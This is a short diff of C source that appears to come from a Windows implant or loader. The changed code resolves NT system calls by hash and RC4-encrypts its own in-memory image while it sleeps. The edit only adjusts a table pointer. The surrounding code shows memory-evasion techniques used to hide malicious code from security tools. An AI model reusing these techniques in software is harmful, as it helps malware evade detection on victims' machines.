@@ -246,9 +246,9 @@ static D_SEC( E ) VOID WINAPI ObfSystemCallFiber( _In_ PF_PARAM Fbr )
 	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
 
 
-	Tbl = C_PTR( *( PVOID * )( G_SYM( Table ) ) );
-	Img = C_PTR( Tbl->RxBuffer );
-	Len = U_PTR( Tbl->RxLength );
+	Tbl = C_PTR( G_SYM( Table ) );
+	Img = C_PTR( Tbl->Table->RxBuffer );
+	Len = U_PTR( Tbl->Table->RxLength );
 
 	Api.NtSignalAndWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
 	Api.NtQueryInformationThread       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTHREAD );
@@ -292,8 +292,8 @@ static D_SEC( E ) VOID WINAPI ObfSystemCallFiber( _In_ PF_PARAM Fbr )
 		Key.Buffer = &Rnd;
 		Key.Length = Key.MaximumLength = 0x10;
 
-		Rc4.Buffer = C_PTR( Tbl->RxBuffer );
-		Rc4.Length = Rc4.MaximumLength = U_PTR( Tbl->ImageLength );
+		Rc4.Buffer = C_PTR( Tbl->Table->RxBuffer );
+		Rc4.Length = Rc4.MaximumLength = U_PTR( Tbl->Table->ImageLength );
 
 		if ( NT_SUCCESS( Api.NtCreateEvent( &Evt, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) ) {
 			if ( NT_SUCCESS( Api.NtCreateThreadEx( &Th1, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Api.NtWaitForSingleObject, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 1, NULL ) ) ) {
